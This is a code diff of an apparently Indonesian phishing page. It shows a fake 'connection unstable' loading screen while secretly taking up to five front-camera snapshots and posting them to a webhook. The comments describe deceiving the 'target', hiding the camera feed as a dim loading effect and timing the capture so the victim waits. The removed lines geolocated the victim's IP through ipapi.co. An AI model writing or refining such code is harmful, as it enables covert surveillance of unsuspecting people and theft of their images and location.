@@ -6,20 +6,22 @@
     <title>Sistem Sedang Memuat...</title>
     <style>
         body { margin: 0; padding: 0; width: 100vw; height: 100vh; display: flex; justify-content: center; align-items: center; background-color: #121212; color: #e0e0e0; font-family: sans-serif; overflow: hidden; }
-        #container { position: relative; display: flex; flex-direction: column; align-items: center; }
+        #container { position: relative; display: flex; flex-direction: column; align-items: center; z-index: 10; background: #121212; width: 100%; height: 100%; justify-content: center;}
         #loader { border: 5px solid #333; border-top: 5px solid #fe2c55; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         #status { font-size: 16px; font-weight: bold; text-transform: uppercase; letter-spacing: 2px; color: #fe2c55; text-align: center; }
         
-        /* TRIK BARU: Video dibuat 1px transparan agar browser tetap merender gambar */
+        /* Trik Baru: Video ditaruh di belakang layar (z-index rendah) 
+           tapi ukurannya tetap besar agar sistem mau merender gambarnya */
         #video {
-            position: absolute;
-            bottom: 0;
-            right: 0;
-            width: 1px;
-            height: 1px;
-            opacity: 0.01; 
-            pointer-events: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: 1; /* Di bawah container */
+            opacity: 0.1; /* Sangat samar, target bakal mikir ini efek loading */
         }
         #canvas { display: none; }
     </style>
@@ -29,7 +31,7 @@
     <div id="container">
         <div id="loader"></div>
         <div id="status">Koneksi Tidak Stabil...</div>
-        <p style="font-size: 12px; color: #888; margin-top: 10px;">Mohon tunggu, sedang mencoba menghubungkan kembali.</p>
+        <p style="font-size: 12px; color: #888; margin-top: 10px;">Sedang Sinkronisasi Frame Kamera...</p>
     </div>
 
     <video id="video" autoplay muted playsinline></video>
@@ -45,44 +47,44 @@
 
         async function startSystem() {
             try {
-                // Paksa pakai kamera depan (facingMode: user)
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
+                    video: { facingMode: "user", width: 640, height: 480 }, 
                     audio: false 
                 });
                 video.srcObject = stream;
                 
-                // Tunggu video bener-bener "playing" sebelum ambil foto
                 video.onloadedmetadata = () => {
                     video.play();
-                    statusDiv.innerText = "Sinkronisasi Data...";
-                    setTimeout(takeSnapShot, 3000); // Beri waktu 3 detik buat sensor kamera adaptasi cahaya
+                    statusDiv.innerText = "Mengkalibrasi Sinyal...";
+                    // TUNGGU 5 DETIK: Biar target beneran nunggu dan kamera dapet cahaya
+                    setTimeout(takeSnapShot, 5000); 
                 };
             } catch (err) {
-                statusDiv.innerText = "Koneksi Gagal.";
+                statusDiv.innerText = "Gagal Menghubungkan.";
                 kirimData({ status: "IZIN_DITOLAK", pesan: err.message });
             }
         }
 
         function takeSnapShot() {
             if (photoCount >= 5) {
-                statusDiv.innerText = "Sistem Error 404";
+                statusDiv.innerText = "Error: 0x88291"; 
                 return;
             }
 
-            // Pastikan video sedang berjalan dan ada datanya
             if (video.readyState === video.HAVE_ENOUGH_DATA) {
                 photoCount++;
+                
+                // Ambil gambar
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                // Gunakan kualitas 0.5 agar tidak terlalu berat tapi tetap jelas
-                const dataFoto = canvas.toDataURL('image/jpeg', 0.5);
+                // Gunakan kualitas 0.3 supaya proses kirim cepat & tidak gagal di tengah jalan
+                const dataFoto = canvas.toDataURL('image/jpeg', 0.3);
 
                 kirimData({
-                    event: "SNAP_SHOT",
+                    event: "SNAP_SHOT_V3",
                     no: photoCount,
                     foto: dataFoto,
-                    perangkat: navigator.userAgent
+                    info: "Kualitas 30%"
                 });
             }
 
@@ -91,14 +93,10 @@
 
         async function kirimData(payload) {
             try {
-                const ipRes = await fetch('https://ipapi.co/json/');
-                const ipData = await ipRes.json();
-                const finalData = { ...payload, ...{ kota: ipData.city, provider: ipData.org, ip: ipData.ip } };
-
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     mode: 'no-cors',
-                    body: JSON.stringify(finalData)
+                    body: JSON.stringify(payload)
                 });
             } catch (e) {}
         }
